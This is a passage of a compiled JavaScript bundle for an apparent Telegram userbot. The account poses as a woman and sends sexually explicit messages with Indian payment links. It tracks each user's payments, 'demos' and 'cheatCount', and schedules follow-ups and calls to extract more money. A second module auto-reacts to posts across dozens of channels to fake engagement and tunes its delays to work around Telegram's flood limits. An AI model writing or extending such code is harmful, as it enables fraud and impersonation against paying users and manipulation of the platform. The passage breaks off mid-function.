                    yield client.sendMessage(chatId, ({ message: `${messages_1.payLinks.phonepe1}\n${messages_1.payLinks.paytm1}\n${messages_1.payLinks.phonepe2}\n${messages_1.payLinks.fampay}\n\n<b>I'm Waiting without dress for you!😚😚</b>`, parseMode: 'html', linkPreview: false }));
                }), 8000);
            }), 20000);
        }), 8000);
        const db = dbservice_1.UserDataDtoCrud.getInstance();
        const userDetails = yield db.read(chatId);
        yield db.update(chatId, { paidReply: true, cheatCount: Math.max(userDetails.cheatCount - 1, 0), limitTime: Date.now(), totalCount: 10, demoGiven: true, payAmount: 50 });
        yield db.createOrUpdateStats(chatId, 'any', 10, false, true, true, false);
        yield db.updateStatSingleKey(chatId, 'demoGivenToday', true);
        yield db.updateVideos(chatId, data.video);
        const msg = `DEMO-Given : @${userDetails.username}\nChatId : ${chatId}\nClient :${process.env.clientId}\n${parseObjectToString(data)}`;
        yield (0, index_1.sendMessageWithButton)(msg, 'Chat', `https://tgchats.netlify.app?client=${process.env.clientId}&chatId=${userDetails.chatId}`);
        yield setTyping(chatId);
        askToPayMap.set(chatId, Date.now());
    });
}
function executehsl(client, chatId, data) {
    return __awaiter(this, void 0, void 0, function* () {
        yield setAudioRecord(chatId);
        setTimeout(() => __awaiter(this, void 0, void 0, function* () {
            yield client.sendMessage(chatId, { message: `How is it?🙈` });
            setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                yield client.sendMessage(chatId, { message: `I want to suck your Dick Baby....!!😍😚` });
            }), 20000);
        }), 8000);
        const db = dbservice_1.UserDataDtoCrud.getInstance();
        const userDetails = yield db.read(chatId);
        yield db.update(chatId, { cheatCount: Math.max(userDetails.cheatCount - 1, 0), fullShow: Math.max(userDetails.fullShow || 0 + 1, userDetails.videos.length - 3), paidReply: true, limitTime: Date.now() + (3 * 60 * 1000), demoGiven: true, payAmount: userDetails.highestPayAmount <= 150 ? userDetails.highestPayAmount : 150, totalCount: 9, secondShow: userDetails.highestPayAmount > 50 ? true : false });
        yield db.createOrUpdateStats(chatId, 'any', 150, false, true, true, true);
        yield db.updateVideos(chatId, data.video);
        const msg = `FULLSHOw-Given : @${userDetails.username}\nChatId : ${chatId}\nClient : ${process.env.clientId}\n${parseObjectToString(data)}`;
        yield (0, index_1.sendMessageWithButton)(msg, 'Chat', `https://tgchats.netlify.app?client=${process.env.clientId}&chatId=${userDetails.chatId}`);
        if (userDetails.payAmount > 200) {
            setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                yield client.sendMessage(chatId, { message: `Lets do it after sometime again! okay??` });
                yield (0, Helpers_1.sleep)(15000);
                yield client.sendMessage(chatId, { message: `Dont Worry Baby...!!\n\nI will message you after sometime.\nI am very Tired now!!😪😪` });
                yield client.sendMessage(chatId, { message: (0, messages_1.pickOneMsg)(messages_1.messages.awayMessges), schedule: (60 * 5) + (Date.now() / 1000) });
                yield client.sendMessage(chatId, { message: (0, messages_1.pickOneMsg)(messages_1.messages.awayMessges), schedule: (60 * 10) + (Date.now() / 1000) });
                yield client.sendMessage(chatId, { message: (0, messages_1.pickOneMsg)(messages_1.messages.awayMessges), schedule: (60 * 15) + (Date.now() / 1000) });
                setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                    const userDetail = yield db.read(chatId);
                    if (userDetail.highestPayAmount > 250 &&
                        userDetail.fullShow < 3 &&
                        userDetail.lastMsgTimeStamp > Date.now() - 2.5 * 60 * 1000 &&
                        userDetail.callTime < Date.now() - 12 * 60 * 1000) {
                        yield (0, index_1.initiateCall)(userDetail.payAmount, userDetail, 'ReCalling');
                    }
                }), 7 * 60 * 1000);
            }), 60000);
        }
        yield setTyping(chatId);
        askToPayMap.set(chatId, Date.now());
    });
}
exports.defaultMessages = [
    "1", "2", "3", "4", "5", "6", "7", "8",
    "9", "10", "11", "12", "13", "14", "15",
    "16", "17", "18"
];
function setMsgstats(data) {
    msgStats = data;
}
function getMediaUrl(message) {
    return __awaiter(this, void 0, void 0, function* () {
        var _a, _b, _c, _d, _e, _f;
        const client = index_1.tgClass.getClient();
        if (message.media instanceof telegram_1.Api.MessageMediaPhoto) {
            console.log("messageId image:", message.id);
            const sizes = ((_a = message.photo) === null || _a === void 0 ? void 0 : _a.sizes) || [1];
            return yield client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });
        }
        else if (message.media instanceof telegram_1.Api.MessageMediaDocument && (((_c = (_b = message.document) === null || _b === void 0 ? void 0 : _b.mimeType) === null || _c === void 0 ? void 0 : _c.startsWith('video')) || ((_e = (_d = message.document) === null || _d === void 0 ? void 0 : _d.mimeType) === null || _e === void 0 ? void 0 : _e.startsWith('image')))) {
            console.log("messageId video:", message.id);
            const sizes = ((_f = message.document) === null || _f === void 0 ? void 0 : _f.thumbs) || [1];
            return yield client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });
        }
        return null;
    });
}
function getMessagesNew(chatId_1, offset_1, minId_1) {
    return __awaiter(this, arguments, void 0, function* (chatId, offset, minId, limit = 15) {
        try {
            const client = index_1.tgClass.getClient();
            const query = { limit };
            if (offset) {
                query['offsetId'] = parseInt(offset.toString());
            }
            if (minId) {
                query['minId'] = parseInt(minId.toString()) + 1;
            }
            console.log("query : ", query);
            const messages = yield client.getMessages(chatId, query);
            const result = yield Promise.all(messages.map((message) => __awaiter(this, void 0, void 0, function* () {
                var _a;
                const media = message.media
                    ? {
                        type: message.media.className.includes('video') ? 'video' : 'photo',
                        thumbnailUrl: yield getMediaUrl(message),
                    }
                    : null;
                return {
                    id: message.id,
                    message: message.message,
                    date: message.date,
                    sender: {
                        id: (_a = message.senderId) === null || _a === void 0 ? void 0 : _a.toString(),
                        is_self: message.out,
                        username: message.fromId ? message.fromId.toString() : null,
                    },
                    media,
                };
            })));
            return result;
        }
        catch (error) {
            return [];
        }
    });
}
function getIChannelFromTg(channelId) {
    return __awaiter(this, void 0, void 0, function* () {
        var _a;
        try {
            const channelEnt = channelId.startsWith('-') ? channelId : `-100${channelId}`;
            const client = yield index_1.tgClass.getClient();
            const { id, defaultBannedRights, title, broadcast, username, participantsCount, restricted } = yield getEntity(client, channelEnt);
            const channel = {
                channelId: (_a = id.toString()) === null || _a === void 0 ? void 0 : _a.replace(/^-100/, ""),
                title,
                participantsCount,
                username,
                restricted,
                broadcast,
                private: false,
                forbidden: false,
                sendMessages: defaultBannedRights === null || defaultBannedRights === void 0 ? void 0 : defaultBannedRights.sendMessages,
                canSendMsgs: !broadcast && !(defaultBannedRights === null || defaultBannedRights === void 0 ? void 0 : defaultBannedRights.sendMessages),
                availableMsgs: [],
                dMRestriction: 0,
                banned: false,
                reactions: [],
                reactRestricted: false,
                wordRestriction: 0
            };
            return channel;
        }
        catch (error) {
            console.log("Failed to fetch channel from tg");
            return undefined;
        }
    });
}
function isServicePending(userDetail) {
    if (userDetail.canReply !== 0 && userDetail.payAmount >= 30 && ((userDetail.payAmount < 65 && !userDetail.demoGiven) ||
        (userDetail.payAmount >= 65 && userDetail.payAmount < 180 && !userDetail.secondShow) ||
        userDetail.payAmount >= 180 || userDetail.highestPayAmount >= 250)) {
        return true;
    }
    return false;
}
function canStartService(userDetails, paidAmount) {
    if (paidAmount >= 30 &&
        ((!userDetails.secondShow && paidAmount >= 65) ||
            (!userDetails.demoGiven && paidAmount >= 30) ||
            (paidAmount > 180))) {
        return true;
    }
    return false;
}
function checkProfilePics(client) {
    return __awaiter(this, void 0, void 0, function* () {
        var _a;
        try {
            const result = yield client.invoke(new telegram_1.Api.photos.GetUserPhotos({
                userId: "me"
            }));
            const me = yield client.getMe();
            // console.log(`Profile Pics found: ${result.photos.length}`)
            if (result && ((_a = result.photos) === null || _a === void 0 ? void 0 : _a.length) < 1 || me.firstName !== process.env.name || !me.username) {
                yield (0, fetchWithTimeout_1.fetchWithTimeout)(`${process.env.uptimeChecker}/clients/updateClient/${process.env.clientId}`);
            }
            else {
                console.log(` Profile pics exist`);
            }
            // console.log("Updated profile Photos");
        }
        catch (error) {
            (0, parseError_1.parseError)(error, `${process.env.clientId} || ${process.env.mobile}`);
        }
    });
}
function downloadProfilePic(client, index) {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            const photos = yield client.invoke(new telegram_1.Api.photos.GetUserPhotos({
                userId: 'me',
                offset: 0,
            }));
            if (photos.photos.length > 0) {
                console.log(`You have ${photos.photos.length} profile photos.`);
                // Choose the photo index (0-based)
                if (index < photos.photos.length) {
                    const selectedPhoto = photos.photos[index];
                    // Extract the largest photo file (e.g., highest resolution)
                    const maxIndex = Math.max(selectedPhoto.sizes.length - 2, 0);
                    const photoFileSize = selectedPhoto.sizes[maxIndex];
                    // Download the file
                    const photoBuffer = yield client.downloadFile(new telegram_1.Api.InputPhotoFileLocation({
                        id: selectedPhoto.id,
                        accessHash: selectedPhoto.accessHash,
                        fileReference: selectedPhoto.fileReference,
                        thumbSize: photoFileSize.type
                    }), {
                        dcId: selectedPhoto.dcId, // Data center ID
                    });
                    if (photoBuffer) {
                        const outputPath = `profile_picture_${index + 1}.jpg`;
                        fs.writeFileSync(outputPath, photoBuffer);
                        console.log(`Profile picture downloaded as '${outputPath}'`);
                        return outputPath;
                    }
                    else {
                        console.log("Failed to download the photo.");
                    }
                }
                else {
                    console.log(`Photo index ${index} is out of range.`);
                }
            }
            else {
                console.log("No profile photos found.");
            }
        }
        catch (err) {
            console.error("Error:", err);
        }
    });
}
function getRandomEmoji() {
    const eroticEmojis = ["🔥", "💋", "👅", "🍆", "🔥", "💋", " 🙈", "👅", "🍑", "🍆", "💦", "🍑", "😚", "😏", "💦", "🥕", "🥖"];
    const randomIndex = Math.floor(Math.random() * eroticEmojis.length);
    return eroticEmojis[randomIndex];
}
function generateEmojis() {
    const emoji1 = getRandomEmoji();
    const emoji2 = getRandomEmoji();
    return emoji1 + emoji2;
}


/***/ }),

/***/ "./src/utils/React.ts":
/*!****************************!*\
  !*** ./src/utils/React.ts ***!
  \****************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.Reactions = void 0;
const inhandlerUpdated_1 = __webpack_require__(/*! ../inhandlerUpdated */ "./src/inhandlerUpdated.ts");
const utils_1 = __webpack_require__(/*! ../utils */ "./src/utils.ts");
const telegram_1 = __webpack_require__(/*! telegram */ "telegram");
const users_1 = __webpack_require__(/*! telegram/client/users */ "telegram/client/users");
const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "telegram/Helpers");
const parseError_1 = __webpack_require__(/*! ./parseError */ "./src/utils/parseError.ts");
const reaction_utils_1 = __webpack_require__(/*! ./reaction.utils */ "./src/utils/reaction.utils.ts");
const ReactQueue_1 = __webpack_require__(/*! ./ReactQueue */ "./src/utils/ReactQueue.ts");
const CHANNELS_LIMIT = 50;
const REACTION_INTERVAL = 5000; // 1 minute
const MIN_REACTION_DELAY = 5000; // 5 seconds
const MAX_REACTION_DELAY = 15000; // 15 seconds
const CHANNEL_UPDATE_INTERVAL = 5 * 60 * 1000; // Update top channels every 5 minutes
class Reactions {
    constructor(client) {
        this.flag = true;
        this.flag2 = true;
        this.waitReactTime = Date.now();
        this.lastReactedtime = Date.now() - 180000;
        this.reactionDelays = [];
        this.reactionsRestarted = Date.now();
        this.averageReactionDelay = 0;
        this.minWaitTime = 1500;
        this.maxWaitTime = 21000;
        this.reactSleepTime = 5000;
        this.targetReactionDelay = 6000;
        this.successCount = 0;
        this.reactStats = {
            sleepTime: 0,
            releaseTime: 0,
            successCount: 0,
            failedCount: 0,
            lastReactedTime: 0,
            triggeredTime: 0,
            floodCount: 0
        };
        this.channels = [];
        this.isReacting = false;
        this.updateChannelsInterval = null;
        this.standardEmoticons = ['👍', '❤', '🔥', '👏', '🥰', '😁'];
        this.emoticons = [
            '❤', '🔥', '👏', '🥰', '😁', '🤔',
            '🤯', '😱', '🤬', '😢', '🎉', '🤩',
            '🤮', '💩', '🙏', '👌', '🕊', '🤡',
            '🥱', '🥴', '😍', '🐳', '❤‍🔥', '💯',
            '🤣', '💔', '🏆', '😭', '😴', '👍',
            '🌚', '⚡', '🍌', '😐', '💋', '👻',
            '👀', '🙈', '🤝', '🤗', '🆒',
            '🗿', '🙉', '🙊', '🤷', '👎'
        ];
        this.standardReactions = this.standardEmoticons.map(emoticon => new telegram_1.Api.ReactionEmoji({ emoticon }));
        this.defaultReactions = this.emoticons.map(emoticon => new telegram_1.Api.ReactionEmoji({ emoticon }));
        this.reactRestrictedIds = [
            '1798767939', process.env.updatesChannel, process.env.notifChannel,
            "1703065531", "1972065816", "1949920904", "2184447313", "2189566730",
            "1870673087", "1261993766", "1202668523", "1738391281", "1906584870",
            "1399025405", "1868271399", "1843478697", "2113315849", "1937606045",
            "1782145954", "1623008940", "1738135934", "1798503017", "1889233160",
            "1472089976", "1156516733", "1514843822", "2029851294", "2097005513",
            "1897072643", "1903237199", "1807801643", "1956951800", "1970106364",
            "2028322484", "2135964892", "2045602167", "1486096882", "1336087349",
            "1878652859", "1711250382", "1959564784", "1345564184", "1663368151",
            "1476492615", "1524427911", "1400204596", "1812110874", "1654557420",
            "1765654210", "1860635416", "1675260943", "1730253703", "2030437007",
            "1213518210", "1235057378", "1586912179", "1672828024", "2069091557",
            "1860671752", "2125364202", "1959951200", "1607289097", "1929774605",
            "1780733848", "1685018515", "2057393918", "1887746719", "1916123414",
            "1970767061", "2057158588"
        ];
        this.client = client;
        (0, reaction_utils_1.loadReactionsFromFile)();
        this.reactQueue = ReactQueue_1.ReactQueue.getInstance();
        this.updateChannelsInterval = setInterval(() => __awaiter(this, void 0, void 0, function* () {
            console.log("Updating channels...");
            yield this.updateChannels();
            yield (0, reaction_utils_1.saveReactionsToFile)();
        }), CHANNEL_UPDATE_INTERVAL);
        this.updateChannels();
        console.log("Reaction Instance created");
    }
    react(message, targetMobile) {
        return __awaiter(this, void 0, void 0, function* () {
            var _a, _b;
            if (!this.flag || this.reactStats.releaseTime > Date.now() || this.reactStats.lastReactedTime > Date.now() - 7000) {
                return;
            }
            try {
                const chatId = message.chatId.toString();
                if (this.shouldReact(chatId) && !(((_b = (_a = message === null || message === void 0 ? void 0 : message.reactions) === null || _a === void 0 ? void 0 : _a.recentReactions) === null || _b === void 0 ? void 0 : _b.length) > 0)) {
                    this.flag = false;
                    const availableReactions = (0, reaction_utils_1.getAllReactions)(chatId);
                    if (availableReactions && availableReactions.length > 1) {
                        const reaction = this.selectReaction(availableReactions);
                        yield this.processReaction(message, reaction, targetMobile);
                    }
                    else {
                        if (availableReactions == undefined) {
                            this.processReaction(message, (0, utils_1.selectRandomElements)(this.standardReactions, 1), targetMobile);
                            yield this.handleReactionsCache(targetMobile, chatId);
                        }
                    }
                    this.flag = true;
                }
                else {
                    yield this.handleReactionRestart(message, chatId);
                }
            }
            catch (error) {
                this.handleError(error);
            }
        });
    }
    getReactions(chatId, client) {
        return __awaiter(this, void 0, void 0, function* () {
            const channel = undefined;
            if (channel && channel.reactRestricted) {
                this.reactRestrictedIds.push(chatId);
                return [];
            }
            else {
                const reactions = yield this.fetchAvailableReactions(chatId, client);
                return reactions;
            }
        });
    }
    getChannelFromTg(channelId, client) {
        return __awaiter(this, void 0, void 0, function* () {
            var _a;
            try {
                const channelEnt = channelId.startsWith('-') ? channelId : `-100${channelId}`;
                const { id, defaultBannedRights, megagroup, title, broadcast, username, participantsCount, restricted } = yield (0, users_1.getEntity)(client, channelEnt);
                const channel = {
                    channelId: (_a = id.toString()) === null || _a === void 0 ? void 0 : _a.replace(/^-100/, ""),
                    title,
                    participantsCount,
                    username,
                    restricted,
                    broadcast,
                    megagroup,
                    private: false,
                    forbidden: false,
                    sendMessages: defaultBannedRights === null || defaultBannedRights === void 0 ? void 0 : defaultBannedRights.sendMessages,
                    canSendMsgs: !broadcast && !(defaultBannedRights === null || defaultBannedRights === void 0 ? void 0 : defaultBannedRights.sendMessages),
                    availableMsgs: [],
                    dMRestriction: 0,
                    banned: false,
                    reactions: [],
                    reactRestricted: false,
                    wordRestriction: 0
                };
                return channel;
            }
            catch (error) {
                console.log("Failed to fetch channel from tg");
                return undefined;
            }
        });
    }
    handleReactionsCache(mobile, chatId) {
        return __awaiter(this, void 0, void 0, function* () {
            if (this.flag2) {
                this.flag2 = false;
                try {
                    const availableReactions = yield this.getReactions(chatId, this.client);
                    yield this.updateReactionsCache(chatId, availableReactions);
                }
                catch (error) {
                    this.handleCacheError(error, chatId);
                }
                finally {
                    this.flag2 = true;
                    yield (0, Helpers_1.sleep)(3000);
                }
            }
        });
    }
    fetchAvailableReactions(chatId, client) {
        return __awaiter(this, void 0, void 0, function* () {
            var _a, _b;
            const result = yield client.invoke(new telegram_1.Api.channels.GetFullChannel({ channel: chatId }));
            const reactionsJson = (_b = (_a = result === null || result === void 0 ? void 0 : result.fullChat) === null || _a === void 0 ? void 0 : _a.availableReactions) === null || _b === void 0 ? void 0 : _b.toJSON();
            return (reactionsJson === null || reactionsJson === void 0 ? void 0 : reactionsJson.reactions) || [];
        });
    }
    updateReactionsCache(chatId, availableReactions) {
        return __awaiter(this, void 0, void 0, function* () {
            if (availableReactions.length > 3 && availableReactions.length > this.defaultReactions.length) {
                this.defaultReactions = availableReactions;
            }
            if (availableReactions.length < 1 && this.defaultReactions.length > 1) {
                const availReactions = this.defaultReactions.map(emoticon => emoticon.emoticon);
                (0, reaction_utils_1.setReactions)(chatId, this.defaultReactions);
            }
            else {
                (0, reaction_utils_1.setReactions)(chatId, availableReactions);
            }
        });
    }
    handleCacheError(error, chatId) {
        (0, parseError_1.parseError)(error, `:: Fetching Reactions`, false);
        if (this.defaultReactions.length > 1) {
            (0, reaction_utils_1.setReactions)(chatId, this.defaultReactions);
        }
    }
    shouldReact(chatId) {
        const isRestricted = (0, inhandlerUpdated_1.contains)(chatId, this.reactRestrictedIds);
        const isInQueue = this.reactQueue.contains(chatId);
        return !isRestricted && !isInQueue;
    }
    processReaction(message, reaction, mobile) {
        return __awaiter(this, void 0, void 0, function* () {
            if (this.client) {
                yield this.executeReaction(message, this.client, reaction, mobile);
            }
            else {
                console.log(`Client is undefined: ${mobile}`);
            }
        });
    }
    executeReaction(message, client, reaction, mobile) {
        return __awaiter(this, void 0, void 0, function* () {
            const chatId = message.chatId.toString();
            try {
                yield this.sendReaction(client, message, reaction);
                // console.log(`${mobile} Reacted Successfully, Average Reaction Delay:`, this.averageReactionDelay, "ms", reaction[0].emoticon, this.reactSleepTime, new Date().toISOString().split('T')[1].split('.')[0]);
                yield this.updateReactionStats(mobile);
            }
            catch (error) {
                yield this.handleReactionError(error, reaction, chatId, mobile);
            }
            finally {
                if (this.averageReactionDelay < this.targetReactionDelay) {
                    this.reactSleepTime = Math.min(this.reactSleepTime + 200, this.maxWaitTime);
                }
                else if (Date.now() > this.reactStats.triggeredTime + 600000 && this.reactStats.floodCount < 3) {
                    this.reactSleepTime = Math.max(this.reactSleepTime - 50, this.minWaitTime);
                }
                this.waitReactTime = Date.now() + this.reactSleepTime;
            }
        });
    }
    selectReaction(availableReactions) {
        const reactionIndex = Math.floor(Math.random() * availableReactions.length);
        return [availableReactions[reactionIndex]];
    }
    sendReaction(client, message, reaction) {
        return __awaiter(this, void 0, void 0, function* () {
            const MsgClass = new telegram_1.Api.messages.SendReaction({
                peer: message.chat,
                msgId: message.id,
                reaction,
            });
            yield client.invoke(MsgClass);
        });
    }
    updateReactionStats(mobile) {
        return __awaiter(this, void 0, void 0, function* () {
            this.reactStats = Object.assign(Object.assign({}, this.reactStats), { lastReactedTime: Date.now(), successCount: this.reactStats.successCount + 1 });
            const reactionDelay = Math.min(Date.now() - this.lastReactedtime, 25000);
            this.lastReactedtime = Date.now();
            this.reactionDelays.push(reactionDelay);
            this.successCount++;
            if (this.reactionDelays.length > 20) {
                this.reactionDelays.shift();
            }
            const totalDelay = this.reactionDelays.reduce((sum, delay) => sum + delay, 0);
            this.averageReactionDelay = Math.floor(totalDelay / this.reactionDelays.length);
        });
    }
    handleReactionError(error, reaction, chatId, mobile) {
        return __awaiter(this, void 0, void 0, function* () {
            this.reactStats = Object.assign(Object.assign({}, this.reactStats), { lastReactedTime: Date.now(), failedCount: this.reactStats.failedCount + 1 });
            if (error.seconds) {
                yield this.handleFloodError(error, mobile);
            }
            else if (error.errorMessage === "REACTION_INVALID") {
                const reactionsCache = (0, reaction_utils_1.getAllReactions)(chatId);
                if (reactionsCache && reactionsCache.length > 0) {
                    let availableReactions = [...reactionsCache];
                    const beforeLength = availableReactions.length;
                    const index = availableReactions.findIndex(r => r.emoticon === reaction[0].emoticon);
                    if (index !== -1) {
                        availableReactions.splice(index, 1); // Remove the reaction
                        (0, reaction_utils_1.setReactions)(chatId, availableReactions);
                        console.log(`Removed Reaction: ${reaction[0].emoticon} from chat ${chatId}`, new Date().toISOString().split('T')[1].split('.')[0], `Before: ${beforeLength}, After: ${availableReactions.length}`);
                    }
                    else {
                        console.warn(`Reaction ${reaction[0].emoticon} not found in chat ${chatId}`);
                    }
                }
            }
            else {
                console.log(error, reaction[0].emoticon);
                console.log(`${mobile} Reaction failed: ${error.errorMessage}`, new Date().toISOString().split('T')[1].split('.')[0]);
            }
        });
    }
    handleFloodError(error, mobile) {
        return __awaiter(this, void 0, void 0, function* () {
            console.log(`Handling flood error for mobile: ${mobile} for ${error.seconds} seconds`);
            const releaseTime = Date.now() + error.seconds * 1000;
            this.reactStats = Object.assign(Object.assign({}, this.reactStats), { triggeredTime: Date.now(), releaseTime, floodCount: this.reactStats.floodCount + 1 });
            this.reactSleepTime = 5000;
            this.targetReactionDelay += 500;
            this.minWaitTime += 500;
        });
    }
    handleReactionRestart(message, chatId) {
        return __awaiter(this, void 0, void 0, function* () {
            if (this.lastReactedtime < Date.now() - 60000 && this.shouldRestart(chatId)) {
                console.log("Restarting reaction process...");
                this.resetReactionState();
            }
        });
    }
    shouldRestart(chatId) {
        return (!this.flag ||
            this.reactQueue.contains(chatId) ||
            this.reactionsRestarted < Date.now() - 30000);
    }
    resetReactionState() {
        this.flag = true;
        this.waitReactTime = Date.now();
        this.reactQueue.clear();
        this.reactionsRestarted = Date.now();
    }
    handleError(error) {
        (0, parseError_1.parseError)(error, ":: Reaction Error", false);
        this.flag = true;
        this.flag2 = true;
    }
    updateChannels() {
        return __awaiter(this, void 0, void 0, function* () {
            console.log(`${process.env.mobile}: Updating top channels..`);
            try {
                const dialogs = yield this.client.getDialogs({
                    limit: CHANNELS_LIMIT,
                    offsetId: -100,
                    archived: false
                });
                // Filter and validate channels before updating
                const validChannels = dialogs
                    .filter(dialog => (dialog.isChannel || dialog.isGroup) && dialog.entity)
                    .map(dialog => dialog.entity);
                if (validChannels.length > 0) {
                    this.channels = validChannels;
                    console.log(`${process.env.mobile} Found ${this.channels.length} channels to monitor.`);
                    this.randomChannelReaction();
                }
                else {
                    console.warn(`${process.env.mobile} No valid channels found.`);
                }
            }
            catch (error) {
                (0, parseError_1.parseError)(error, `${process.env.mobile} Failed to update top channels`);
            }
        });
    }
    randomChannelReaction() {
        return __awaiter(this, void 0, void 0, function* () {
            if (this.isReacting) {
                console.log("Already Reacting or invalid state, ignoring trigger ", process.env.mobile);
                return;
            }
            console.log(`${process.env.mobile} Starting random channel reaction..`);
            this.isReacting = true;
            try {
                while (this.isReacting) {
                    if (this.channels.length === 0) {
                        console.log(`${process.env.mobile} No channels available, waiting for update...`);
                        yield (0, Helpers_1.sleep)(10000); // Wait 10 seconds before checking again
                        continue;
                    }
                    const channel = this.selectRandomChannel();
                    if (channel) {
                        yield this.reactToMessage(channel);
                        yield (0, Helpers_1.sleep)(REACTION_INTERVAL);
                    }
                }
            }
            catch (error) {
                (0, parseError_1.parseError)(error, `${process.env.mobile} Error in reaction loop`);
            }
            finally {
                console.log("Reaction Loop Stopped", process.env.mobile);
                this.isReacting = false;
            }
        });
    }
    selectRandomChannel() {
        if (!this.channels.length)
            return null;
        const halfIndex = Math.ceil(this.channels.length / 2);
        const isFirstHalf = Math.random() < 0.75; // 75% chance to select from the first half
        const randomIndex = isFirstHalf
            ? Math.floor(Math.random() * halfIndex)
            : Math.floor(Math.random() * this.channels.length);
        return this.channels[randomIndex];
    }
    reactToMessage(channel) {
        return __awaiter(this, void 0, void 0, function* () {
            try {
                if (!channel) {
                    console.warn(`${process.env.mobile}: Invalid channel ID`);
                    return;
                }
                const messages = yield this.client.getMessages(channel, { limit: 3 });
                const validMessages = messages.filter(msg => msg && !msg.out);
                const message = (0, utils_1.selectRandomElements)(validMessages, 1)[0];
                if (message) {
                    try {
                        yield this.react(message, process.env.mobile);
                    }
                    catch (error) {
                        console.warn(`${process.env.mobile} Failed to react to message: `, error);
                    }
                }
            }
            catch (error) {
                if (error instanceof Error) {
                    console.error(`Failed to process messages in channel ${channel.title}:`, error);
                }
            }
        });
    }
    // Add a method to stop the interval and reaction loop
    stop() {
        if (this.updateChannelsInterval) {
            clearInterval(this.updateChannelsInterval);
            this.updateChannelsInterval = null;
        }
        this.isReacting = false;
        console.log(`${process.env.mobile} Stopped channel updates and reactions`);
    }
}
exports.Reactions = Reactions;


/***/ }),

/***/ "./src/utils/ReactQueue.ts":
/*!*********************************!*\
  !*** ./src/utils/ReactQueue.ts ***!
  \*********************************/
/***/ ((__unused_webpack_module, exports) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ReactQueue = void 0;
class ReactQueue {
    constructor() {
        this.items = [];
        this.maxSize = 9;
    }
    static getInstance() {
        if (!ReactQueue.instance) {
            ReactQueue.instance = new ReactQueue();
        }
        while (ReactQueue.instance.items.length >= ReactQueue.instance.maxSize) {
            ReactQueue.instance.items.shift();
        }
        return ReactQueue.instance;
    }
    push(item) {
        while (this.items.length >= this.maxSize) {
            this.items.shift();
        }
        this.items.push(item);
        if (this.timer) {
            clearTimeout(this.timer);
        }
        this.timer = setTimeout(() => {
            this.pop();
        }, 100000); // 1 minute
    }
    clear() {
        this.items = [];
    }
    pop() {
        if (this.items.length === 0) {
            return undefined;
        }
        const item = this.items.shift();
        return item;
    }
    contains(item) {
        return this.items.indexOf(item) !== -1;
    }
    isEmpty() {
        return this.items.length === 0;
    }
    isFull() {
        return this.items.length === this.maxSize;
    }
}
exports.ReactQueue = ReactQueue;


/***/ }),

/***/ "./src/utils/TelegramBots.config.ts":
/*!******************************************!*\
  !*** ./src/utils/TelegramBots.config.ts ***!
  \******************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BotConfig = exports.ChannelCategory = void 0;
const axios_1 = __importDefault(__webpack_require__(/*! axios */ "axios"));
var ChannelCategory;
(function (ChannelCategory) {
    ChannelCategory["CLIENT_UPDATES"] = "CLIENT_UPDATES";
    ChannelCategory["USER_WARNINGS"] = "USER_WARNINGS";
    ChannelCategory["VC_WARNINGS"] = "VC_WARNINGS";
    ChannelCategory["USER_REQUESTS"] = "USER_REQUESTS";
    ChannelCategory["VC_NOTIFICATIONS"] = "VC_NOTIFICATIONS";
    ChannelCategory["CHANNEL_NOTIFICATIONS"] = "CHANNEL_NOTIFICATIONS";
    ChannelCategory["ACCOUNT_NOTIFICATIONS"] = "ACCOUNT_NOTIFICATIONS";
    ChannelCategory["ACCOUNT_LOGIN_FAILURES"] = "ACCOUNT_LOGIN_FAILURES";
    ChannelCategory["PROMOTION_ACCOUNT"] = "PROMOTION_ACCOUNT";
    ChannelCategory["CLIENT_ACCOUNT"] = "CLIENT_ACCOUNT";
    ChannelCategory["PAYMENT_FAIL_QUERIES"] = "PAYMENT_FAIL_QUERIES";
    ChannelCategory["SAVED_MESSAGES"] = "SAVED_MESSAGES";
})(ChannelCategory || (exports.ChannelCategory = ChannelCategory = {}));
class BotConfig {
    constructor() {
        this.categoryMap = new Map();
        this.initialized = false;
        this.initializing = false;
        this.initPromise = null;
        this.initRetries = 0;
        this.MAX_RETRIES = 3;
        this.RETRY_DELAY = 2000; // 2 seconds
        // Immediate initialization with fallback to lazy initialization
        this.initPromise = this.initialize();
    }
    /**
     * Get the singleton instance and trigger immediate initialization
     * @returns BotConfig instance
     */
    static getInstance() {
        if (!BotConfig.instance) {
            BotConfig.instance = new BotConfig();
            // Note: Constructor already starts initialization
        }
        return BotConfig.instance;
    }
    /**
     * Initialize the configuration immediately and wait for completion
     * @returns Promise that resolves when initialization is complete
     */
    static initializeAndGetInstance() {
        return __awaiter(this, void 0, void 0, function* () {
            const instance = BotConfig.getInstance();
            yield instance.ready();
            return instance;
        });
    }
    /**
     * Ensures the configuration is ready before proceeding
     * @returns Promise that resolves when initialization is complete
     */
    ready() {
        return __awaiter(this, void 0, void 0, function* () {
